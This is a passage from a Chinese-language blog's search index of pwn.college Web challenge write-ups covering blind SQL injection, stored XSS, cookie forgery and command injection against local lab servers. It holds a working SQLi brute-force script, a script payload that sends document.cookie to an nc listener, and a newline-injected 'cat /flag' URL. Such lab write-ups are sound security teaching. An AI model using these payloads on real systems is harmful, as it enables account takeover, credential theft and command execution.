class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>flag=<span class="hljs-string">r&quot;pwn.college&#123;&quot;</span><br>flagLen=<span class="hljs-number">59</span><br>url=<span class="hljs-string">&quot;http://challenge.localhost:80&quot;</span><br>hostName=&#123;<span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;challenge.localhost:80&quot;</span>&#125;<br>password=<span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-comment">#admin &#x27; and SUBSTR(password,1,1)=&#x27;p&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">13</span>,flagLen+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> charac <span class="hljs-keyword">in</span> string.printable:<br>        username=<span class="hljs-string">&quot;admin&#x27; and SUBSTR(password,&quot;</span>+<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&quot;,1)=&#x27;&quot;</span><br>        username+=charac<br>        username+=<span class="hljs-string">&quot;&#x27; -- &quot;</span><br>        body=&#123;<span class="hljs-string">&quot;username&quot;</span>:username,<span class="hljs-string">&quot;password&quot;</span>:password&#125;<br>        response=requests.post(url,data=body,headers=hostName)<br>        <span class="hljs-keyword">if</span> response.status_code==<span class="hljs-number">200</span>:<br>            flag+=charac<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br></code></pre></td></tr></table></figure><p>这里由于python的requests模块自动跟随重定向了，把判断条件改成状态码&#x3D;&#x3D;200，也可以关掉重定向，一样的<br><br>运行脚本后等待一段时间即可输出flag了<br><img src="/../../../../../../../photos/pwn.college/intro/Web/SQLi-5.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS-7</title>
    <link href="/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/XSS-7/"/>
    <url>/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/XSS-7/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一个攻击者的目标可能是完全接管受害者账户，这需要认证信息，该信息常存储在cookie中，如果能够拿到cookie，就可以绕过服务端的身份认证，这一关将登录用户的信息存储在了cookie中</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先看server端的源码<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> user:<br>        page += <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            &lt;form action=draft method=post&gt;</span><br><span class="hljs-string">              Post:&lt;textarea name=content&gt;Write something!&lt;/textarea&gt;</span><br><span class="hljs-string">              &lt;input type=checkbox name=publish&gt;Publish</span><br><span class="hljs-string">              &lt;input type=submit value=Save&gt;</span><br><span class="hljs-string">            &lt;/form&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;form action=publish method=post&gt;&lt;input type=submit value=&quot;Publish All Drafts&quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">            &lt;hr&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>在发布帖子时，直接拼接用户输入，因此存在XSS漏洞。首先考虑能不能跟XSS-5和6一样，重定向admin用户，让它自己把帖子发出来，但是看到&#x2F;publish路由下存在校验：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span>:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;pwnpost no longer supports admin posting due to rampant flag disclosure&quot;</span>)<br></code></pre></td></tr></table></figure><p>因此无法再通过类似前两题的方式泄露flag，根据题目提示需要我们泄露admin的cookie，再看一下设置cookie的逻辑如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_login</span>():<br>    username = flask.request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>    password = flask.request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `username` form parameter&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> password:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `password` form parameter&quot;</span>)<br><br>    <span class="hljs-comment"># https://www.sqlite.org/lang_select.html</span><br>    user = db.execute(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br><br>    response = flask.redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>    response.set_cookie(<span class="hljs-string">&quot;auth&quot;</span>, username + <span class="hljs-string">&quot;|&quot;</span> + password)<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><p>由于flask默认不开启httponly，因此可以结合XSS漏洞，通过Javascript的document.cookie属性获取cookie</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>根据上述分析，首先要完成XSS注入，之后诱导admin用户访问网页，此时网页会执行注入的js代码，将cookie发到攻击者的服务器<br><br>具体步骤如下：<br><br>首先以guest身份登录，在发帖区填入恶意payload<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://localhost:12345&quot;</span>,&#123;<span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-attr">body</span>:<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&#125;)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>点击提交后，开启接收cookie的服务，此题中在本地开放一个端口即可，尽量选择端口号大一些的，防止被已有进程占用：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -l 12345<br></code></pre></td></tr></table></figure><p>之后运行challenge&#x2F;victim脚本，模拟受害者访问网页的步骤，此时即可在监听端口处看到返回的cookie：<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/XSS-7/LeakToken.png"><br>cookie里包含着admin的口令（其实是flag的倒数20个字符），URL解码之后再次去浏览器以admin身份登录，可以看到其名下的草稿（即flag）<br><img src="/../../../../../../../photos/pwn.college/intro/Web/XSS-7/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS-5</title>
    <link href="/2025/07/15/pwn.college/Intro-to-Cybersecurity/Web/XSS-5/"/>
    <url>/2025/07/15/pwn.college/Intro-to-Cybersecurity/Web/XSS-5/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>&#x2F;challenge目录下有两个程序，server脚本开启网络服务，该服务模拟一个论坛功能，存在登录、发布帖子以及存草稿等功能，victim脚本模拟受害者，会去访问论坛网页，如果XSS注入成功，就能得到flag</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>先看server端源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">db.execute(<span class="hljs-string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT ? AS content, &quot;admin&quot; AS author, FALSE AS published&quot;&quot;&quot;</span>, [flag])<br>db.execute(<span class="hljs-string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT ? AS content, &quot;admin&quot; AS author, FALSE AS published&quot;&quot;&quot;</span>, [flag])<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/publish&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_publish</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> flask.session:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Log in first!&quot;</span>)<br><br>    <span class="hljs-comment"># https://www.sqlite.org/lang_update.html</span><br>    db.execute(<span class="hljs-string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="hljs-string">&quot;username&quot;</span>)])<br>    <span class="hljs-keyword">return</span> flask.redirect(<span class="hljs-string">&quot;/&quot;</span>)<br></code></pre></td></tr></table></figure><p>通过分析上述代码块，发现admin用户名下的帖子正是需要的flag，但初始是草稿状态，只能显示开头12个字符，因此需要想办法让admin把自己的贴子发布出去<br><br>同时注意到如果对应的用户访问了&#x2F;publish路由，就会直接将自己名下的草稿全部发出去，没有二次校验，因此想办法让admin访问注入后的页面，正好观察victim代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">challenge_url = <span class="hljs-string">&quot;http://challenge.localhost:80/&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Visiting <span class="hljs-subst">&#123;challenge_url&#125;</span>&quot;</span>)<br>browser.get(challenge_url)<br><br>browser.find_element(By.NAME, <span class="hljs-string">&quot;username&quot;</span>).send_keys(<span class="hljs-string">&quot;admin&quot;</span>)<br>browser.find_element(By.NAME, <span class="hljs-string">&quot;password&quot;</span>).send_keys(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read().strip())<br>browser.find_element(By.NAME, <span class="hljs-string">&quot;submit&quot;</span>).submit()<br></code></pre></td></tr></table></figure><p>可以发现该脚本正是需要的模拟admin登录，因此可以尝试注入js脚本达到欺骗admin把帖子发出去的目的</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><p>由于guest用户的口令是已知的，可以先以guest身份登录，发布包含恶意Javascript代码的帖子，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://challenge.localhost/publish&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>之后再运行victim脚本，最后刷新网页，可以观察到flag泄露<br><img src="/../../../../../../../photos/pwn.college/intro/Web/XSS5-flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AuthByPass-2</title>
    <link href="/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/AuthByPass-2/"/>
    <url>/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/AuthByPass-2/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>&#x2F;challenge&#x2F;server开启一个用户登录的服务，接收POST请求和GET请求，POST请求要求输入用户名和口令，并去数据库校验；<br><br>GET请求读取传入的cookie值，如果session_user字段是admin就会回显flag到网页</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>阅读server脚本的源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_post</span>():<br>    username = flask.request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>    password = flask.request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `username` form parameter&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> password:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `password` form parameter&quot;</span>)<br><br>    <span class="hljs-comment"># https://www.sqlite.org/lang_select.html</span><br>    user = db.execute(<span class="hljs-string">&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br><br>    response = flask.redirect(flask.request.path)<br>    response.set_cookie(<span class="hljs-string">&#x27;session_user&#x27;</span>, username)<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_get</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (username := flask.request.cookies.get(<span class="hljs-string">&quot;session_user&quot;</span>, <span class="hljs-literal">None</span>)):<br>        page = <span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        page = <span class="hljs-string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="hljs-subst">&#123;username&#125;</span>!&quot;</span><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span>:<br>            page += <span class="hljs-string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read()<br></code></pre></td></tr></table></figure><p>发现服务端的身份验证是有漏洞的，因为当发起GET请求同时传入的cookie是admin的话，就不会再次校验admin的口令，因此首先以guest身份登录，并保存cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://challenge.localhost:80&quot;</span> -X POST -H <span class="hljs-string">&quot;Host:challenge.localhost:80&quot;</span> -c cookies.txt -d <span class="hljs-string">&quot;username=guest&amp;password=password&quot;</span><br></code></pre></td></tr></table></figure><p>去当前文件夹下把cookies.txt里的session_user字段改为admin<br><img src="/../../../../../../../photos/pwn.college/intro/Web/AuthByPass-2/cookie.png"><br>修改完后向服务端再次发起请求，只不过这次是发送GET请求，并且携带该cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://challenge.localhost:80?&quot;</span> -H <span class="hljs-string">&quot;Host:challenge.localhost:80&quot;</span> -b cookies.txt<br></code></pre></td></tr></table></figure><p>最后得到包含flag的响应体<br><img src="/../../../../../../../photos/pwn.college/intro/Web/AuthByPass-2/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CMDi-6</title>
    <link href="/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/CMDi-6/"/>
    <url>/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/CMDi-6/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>&#x2F;challenge目录下面有一个python写的server脚本，运行它会在本机的80端口开放一个http服务。这个命令接收GET方法传参，并且以该参数执行ls命令<br><br>我们需要做的就是想办法在ls之后让服务器的shell再执行我们想要的命令，即连续执行</p><span id="more"></span><h1 id="漏洞点与难点分析"><a href="#漏洞点与难点分析" class="headerlink" title="漏洞点与难点分析"></a>漏洞点与难点分析</h1><p>首先观察server脚本的源代码：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">arg = (<br>        flask.request.args.get(<span class="hljs-string">&quot;subdirectory&quot;</span>, <span class="hljs-string">&quot;/challenge&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    )<br>    command = <span class="hljs-string">f&quot;ls -l <span class="hljs-subst">&#123;arg&#125;</span>&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;DEBUG: <span class="hljs-subst">&#123;command=&#125;</span>&quot;</span>)<br>    result = subprocess.run(<br>        command,  <span class="hljs-comment"># the command to run</span><br>        shell=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># use the shell to run this command</span><br>        stdout=subprocess.PIPE,  <span class="hljs-comment"># capture the standard output</span><br>        stderr=subprocess.STDOUT,  <span class="hljs-comment"># 2&gt;&amp;1</span><br>        encoding=<span class="hljs-string">&quot;latin&quot;</span>,  <span class="hljs-comment"># capture the resulting output as text</span><br>    ).stdout<br></code></pre></td></tr></table></figure><p>发现常见的命令连接符都被过滤了，但是仔细观察发现换行符是漏网之鱼，而在Linux中，换行符也可以起到连续执行命令的效果</p><h1 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h1><p>经过上述分析，直接使用curl工具完成漏洞利用：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://challenge.localhost:80/trial?subdirectory=/challenge%0acat%20/flag&quot;</span><br></code></pre></td></tr></table></figure><p>成功得到包含flag的响应体：<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CMDi-6.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
